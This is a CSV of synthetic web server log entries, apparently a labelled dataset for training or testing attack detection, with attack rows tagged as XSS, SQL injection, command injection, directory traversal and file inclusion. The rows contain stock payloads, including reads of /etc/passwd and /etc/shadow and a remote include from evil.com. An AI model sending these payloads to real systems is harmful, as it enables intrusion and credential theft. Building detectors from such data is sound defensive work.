timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,10.0.0.203,POST,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.206,GET,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.115,POST,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.49,POST,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.107,POST,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.142,POST,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.100,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.40,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.56,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.103,GET,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.1,GET,/img/logo.png,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.66,GET,/,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.3,GET,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.9,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.114,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.132,POST,/vendor/bootstrap.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.143,POST,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.139,POST,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.64,POST,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.114,POST,/product?id=10 OR 1=1,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.84,GET,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.104,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.98,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.1,POST,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.242,GET,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.143,GET,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.85,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.96,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.118,POST,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.97,POST,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.37,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.41,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.184,POST,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.184,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.125,POST,/vendor/bootstrap.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.23,GET,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.181,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.109,GET,/login?user=admin'--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.15,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.28,GET,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.209,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.74,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.79,GET,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.242,GET,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.145,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.85,GET,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.57,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.239,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.201,POST,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.177,GET,/dashboard,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.188,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.171,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.1,GET,/search?q=1' UNION SELECT null--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.17,POST,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.75,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.199,GET,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.161,POST,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.178,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.197,GET,/dashboard,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.250,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.122,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.151,POST,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.120,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.19,POST,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.60,GET,/view?include=../../../../etc/passwd,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.128,POST,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.66,GET,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.103,GET,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.38,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.47,POST,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.166,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.113,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.143,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.145,POST,/img/logo.png,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.184,POST,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.67,GET,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.123,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.226,GET,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.27,POST,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.33,GET,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.199,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.18,GET,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.92,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.45,GET,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.210,POST,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.119,GET,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.232,GET,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.177,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.51,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.30,GET,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.29,POST,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.244,POST,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.129,GET,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.118,POST,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.177,POST,/login?user=admin'--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.46,POST,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.145,POST,/product?id=10 OR 1=1,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.63,GET,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.192,POST,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.234,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.68,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.126,POST,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.223,POST,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.184,GET,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.21,POST,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.237,GET,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.237,GET,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.55,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.179,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.6,POST,/img/logo.png,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.254,POST,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.221,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.161,GET,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.209,GET,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.124,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.224,POST,/view?include=../../../../etc/passwd,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.78,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.132,GET,/,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.225,GET,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.144,POST,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.248,GET,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.230,GET,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.151,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.135,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.43,GET,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.47,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.16,GET,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.118,GET,/page?file=http://evil.com/shell.txt,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.119,GET,/search?q=1' UNION SELECT null--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.95,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.215,GET,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.190,GET,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.94,GET,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.108,POST,/product?id=10 OR 1=1,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.17,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.127,POST,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.51,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.105,GET,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.49,POST,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.202,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.143,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.245,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.102,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.211,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.96,POST,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.211,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.33,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.94,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.229,GET,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.191,GET,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.24,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.158,GET,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.77,GET,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.5,GET,/profile,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.185,GET,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.210,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.16,GET,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.134,POST,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.80,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.119,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.101,POST,/js/app.js,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.58,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.18,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.11,GET,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.90,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.75,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.217,GET,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.209,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.29,POST,/contact,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.176,POST,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.112,GET,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.55,GET,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.77,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.115,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.57,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.74,GET,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.112,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.7,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.57,GET,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.98,POST,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.111,POST,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.206,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.131,GET,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.103,POST,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.130,POST,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.98,POST,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.230,POST,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.198,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.59,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.41,POST,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.70,GET,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.253,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.137,GET,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.235,GET,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.14,GET,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.176,GET,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.8,POST,/profile,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.121,GET,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.114,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.214,GET,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.6,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.171,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.237,GET,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.99,POST,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.78,GET,/profile,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.249,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.191,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.60,GET,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.37,POST,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.229,POST,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.79,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.255,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.88,GET,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.146,POST,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.203,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.229,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.140,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.101,GET,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.228,POST,/contact,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.147,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.32,POST,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.84,GET,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.233,POST,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.195,GET,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.9,GET,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.69,GET,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.175,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.89,GET,/favicon.ico,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.161,POST,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.237,GET,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.107,GET,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.53,POST,/login?user=admin'--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.117,GET,/vendor/bootstrap.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.222,POST,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.161,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.137,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.84,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.72,POST,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.132,POST,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.80,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.98,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.13,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.233,POST,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.161,POST,/view?include=../../../../etc/passwd,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.66,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.158,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.72,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.55,GET,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.214,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.238,GET,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.202,GET,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.1,GET,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.156,POST,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.139,GET,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.4,GET,/contact,304,curl/7.64.1,False,normal
